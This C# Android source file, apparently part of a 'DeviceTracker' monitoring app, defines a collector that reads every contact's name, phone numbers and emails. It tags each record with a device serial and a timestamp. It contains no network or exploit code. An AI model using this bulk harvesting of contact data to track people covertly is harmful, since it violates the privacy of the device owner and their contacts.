using Android.Database;
using Android.Provider;
using DeviceTracker.Models;
using Newtonsoft.Json;

namespace DeviceTracker.Services.Collectors;

/// <summary>
/// يجمع جميع جهات الاتصال من ContentProvider (ContactsContract) في Android.
/// يتطلب: READ_CONTACTS permission
/// </summary>
public class ContactCollector
{
    public static List<ContactRecord> Collect(Android.Content.Context context)
    {
        var records = new List<ContactRecord>();

        try
        {
            var cursor = context.ContentResolver?.Query(
                ContactsContract.Contacts.ContentUri,
                null, null, null, null);

            if (cursor == null) return records;

            while (cursor.MoveToNext())
            {
                try
                {
                    var contactId = GetString(cursor, ContactsContract.Contacts.InterfaceConsts.Id) ?? "";
                    var displayName = GetString(cursor, ContactsContract.Contacts.InterfaceConsts.DisplayName) ?? "";
                    var hasPhone = GetInt(cursor, ContactsContract.Contacts.InterfaceConsts.HasPhoneNumber);

                    var phones = new List<string>();
                    var emails = new List<string>();

                    // جلب أرقام الهواتف
                    if (hasPhone > 0)
                    {
                        var phoneCursor = context.ContentResolver?.Query(
                            ContactsContract.CommonDataKinds.Phone.ContentUri,
                            null,
                            $"{ContactsContract.CommonDataKinds.Phone.InterfaceConsts.ContactId} = ?",
                            [contactId], null);

                        if (phoneCursor != null)
                        {
                            while (phoneCursor.MoveToNext())
                            {
                                var num = GetString(phoneCursor,
                                    ContactsContract.CommonDataKinds.Phone.Number) ?? "";
                                if (!string.IsNullOrEmpty(num))
                                    phones.Add(num);
                            }
                            phoneCursor.Close();
                        }
                    }

                    // جلب الإيميلات
                    var emailCursor = context.ContentResolver?.Query(
                        ContactsContract.CommonDataKinds.Email.ContentUri,
                        null,
                        $"{ContactsContract.CommonDataKinds.Email.InterfaceConsts.ContactId} = ?",
                        [contactId], null);

                    if (emailCursor != null)
                    {
                        while (emailCursor.MoveToNext())
                        {
                            var email = GetString(emailCursor,
                                ContactsContract.CommonDataKinds.Email.Address) ?? "";
                            if (!string.IsNullOrEmpty(email))
                                emails.Add(email);
                        }
                        emailCursor.Close();
                    }

                    var record = new ContactRecord
                    {
                        DeviceSerial = Preferences.Get("device_serial", "UNKNOWN"),
                        ContactId = contactId,
                        DisplayName = displayName,
                        PhoneNumbersJson = JsonConvert.SerializeObject(phones),
                        EmailsJson = JsonConvert.SerializeObject(emails),
                        CapturedAt = DateTime.UtcNow
                    };

                    records.Add(record);
                }
                catch { continue; }
            }

            cursor.Close();
        }
        catch (Java.Lang.SecurityException)
        {
            System.Diagnostics.Debug.WriteLine("[ContactCollector] Permission denied: READ_CONTACTS");
        }
        catch (Exception ex)
        {
            System.Diagnostics.Debug.WriteLine($"[ContactCollector] Error: {ex.Message}");
        }

        return records;
    }

    private static string? GetString(ICursor c, string col)
    {
        var idx = c.GetColumnIndex(col);
        return idx >= 0 ? c.GetString(idx) : null;
    }

    private static int GetInt(ICursor c, string col)
    {
        var idx = c.GetColumnIndex(col);
        return idx >= 0 ? c.GetInt(idx) : 0;
    }
}
